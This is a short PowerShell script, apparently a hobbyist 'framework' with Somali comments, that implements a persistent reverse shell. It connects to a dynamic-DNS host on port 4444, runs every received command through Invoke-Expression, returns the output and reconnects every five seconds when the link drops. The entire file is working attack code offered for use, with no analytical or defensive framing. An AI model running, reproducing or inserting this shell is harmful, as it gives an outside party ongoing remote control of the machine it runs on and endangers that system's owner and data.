# Somali Elite Framework - Stubborn Global Shell
# Author: Eng Khapiip

$HOST_NAME = "khapiip-elite.ddns.net" 
$PORT = 4444

while($true) {
    try {
        # Isku day inuu ku xirmo No-IP-gaaga
        $c = New-Object System.Net.Sockets.TCPClient($HOST_NAME, $PORT)
        $s = $c.GetStream(); [byte[]]$b = 0..65535|% {0}
        
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)
            $sb = (iex $d 2>&1 | Out-String )
            $sb2 = $sb + 'PS ' + (pwd).Path + '> '
            $x = ([text.encoding]::ASCII).GetBytes($sb2)
            $s.Write($x, 0, $x.Length); $s.Flush()
        }
        $c.Close()
    } catch {
        # Haddii uu xiriirku go'o ama IP-gaagu isbeddelo, 5s sug ka dibna dib u raadi No-IP-ga
        Start-Sleep -Seconds 5
    }
}
